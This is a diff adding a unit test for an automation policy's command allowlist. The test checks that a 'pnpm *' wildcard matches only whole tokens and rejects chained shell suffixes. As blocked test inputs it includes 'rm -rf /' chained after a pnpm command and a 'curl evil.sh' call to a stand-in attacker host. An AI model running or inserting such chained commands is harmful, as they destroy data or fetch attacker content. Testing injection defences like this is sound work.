@@ -212,6 +212,38 @@ describe('automation policy', () => {
     expect(chained.reason).toContain('allowed_commands');
   });
 
+  it('wildcard command allowlist matches on whole-token boundaries only', () => {
+    const config = makeConfig({
+      automationPolicy: {
+        requireLabels: [],
+        blockLabels: [],
+        allowedPaths: [],
+        protectedPaths: [],
+        allowedCommands: ['pnpm *'],
+        requireHumanFor: [],
+        maxActiveSessions: 0,
+        maxPausedSessions: 0,
+        maxIssuesPerSession: 0,
+        maxSessionMinutes: 0,
+        maxSessionCostUsd: 0,
+        maxIssueCostUsd: 0,
+      },
+    });
+
+    // Whole-token prefix matches.
+    expect(decisionAllowed(evaluateCommandPolicy(config, 'pnpm test'))).toBe(true);
+    expect(decisionAllowed(evaluateCommandPolicy(config, 'pnpm run build --filter app'))).toBe(true);
+    expect(decisionAllowed(evaluateCommandPolicy(config, 'pnpm'))).toBe(true);
+
+    // A different binary that merely shares the prefix must NOT match.
+    expect(evaluateCommandPolicy(config, 'pnpmster build').status).toBe('blocked');
+    expect(evaluateCommandPolicy(config, 'pnpm-evil --do-bad').status).toBe('blocked');
+
+    // Shell-control suffixes are still rejected even under a wildcard.
+    expect(evaluateCommandPolicy(config, 'pnpm test; rm -rf /').status).toBe('blocked');
+    expect(evaluateCommandPolicy(config, 'pnpm test && curl evil.sh').status).toBe('blocked');
+  });
+
   it('blocks when runtime exceeds max_session_minutes', () => {
     const decision = evaluateRuntimePolicy(makeConfig(), 91 * 60_000);
 
